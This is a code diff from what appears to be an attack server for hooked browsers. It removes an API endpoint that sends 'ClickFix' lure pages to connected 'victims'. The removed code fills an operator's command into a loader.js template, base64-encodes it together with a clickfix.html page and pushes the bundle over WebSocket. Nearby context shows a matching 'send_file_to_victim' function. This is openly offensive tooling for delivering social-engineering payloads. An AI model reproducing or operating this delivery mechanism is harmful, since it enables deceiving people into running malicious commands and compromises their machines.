@@ -14,7 +14,6 @@ from .private_common import (
     configured_upload_limit,
     extract_scripts_from_html,
     get_module_content,
-    get_template_content,
     json,
     logger,
     os,
@@ -113,69 +112,6 @@ async def send_file_to_victim(
         raise HTTPException(
             status_code=500,
             detail="Unable to deliver file",
-        ) from exc
-
-
-@api_router.post("/sessions/{victim_id}/clickfix")
-async def send_clickfix(
-    victim_id: str,
-    request: CommandRequest,
-    auth: str = Depends(verify_api_token)
-):
-    """
-    Generate and send ClickFix HTML to victim via WebSocket
-    Expects: { "command": "<JS_COMMAND>" }
-    """
-    try:
-        # Validate victim connection
-        if not ws_manager.is_victim_connected(victim_id):
-            raise HTTPException(status_code=404, detail="Victim not connected")
-
-        command = request.command
-
-        # Load clickfix.html template
-        clickfix_html = get_template_content("clickfix.html")
-        if not clickfix_html:
-            raise HTTPException(status_code=500, detail="Failed to load clickfix template")
-
-        # Load loader.js template
-        loader_js = get_template_content("loader.js")
-        if not loader_js:
-            raise HTTPException(status_code=500, detail="Failed to load loader.js template")
-
-        # Replace COMMAND in loader.js
-        updated_loader_js = loader_js.replace("COMMAND", command)
-
-        # Inject script into HTML
-        payload = {
-            "html": clickfix_html,
-            "js": updated_loader_js
-        }
-
-        # Encode to base64
-        html_base64 = base64.b64encode(json.dumps(payload).encode('utf-8')).decode('utf-8')
-
-        # Send via WebSocket
-        ws_command = f"module:{html_base64}"
-        success = await ws_manager.send_to_victim(victim_id, ws_command)
-
-        if success:
-            logger.info(f"✅ Attack sent to victim {victim_id}")
-            return {
-                "status": "success",
-                "victim_id": victim_id,
-                "command": command[:60] + "..." if len(command) > 60 else command
-            }
-        else:
-            raise HTTPException(status_code=500, detail="Failed to send WebSocket message")
-
-    except HTTPException:
-        raise
-    except Exception as exc:
-        logger.exception("Failed to send ClickFix to victim %s", victim_id)
-        raise HTTPException(
-            status_code=500,
-            detail="Unable to deliver ClickFix",
         ) from exc
 
 
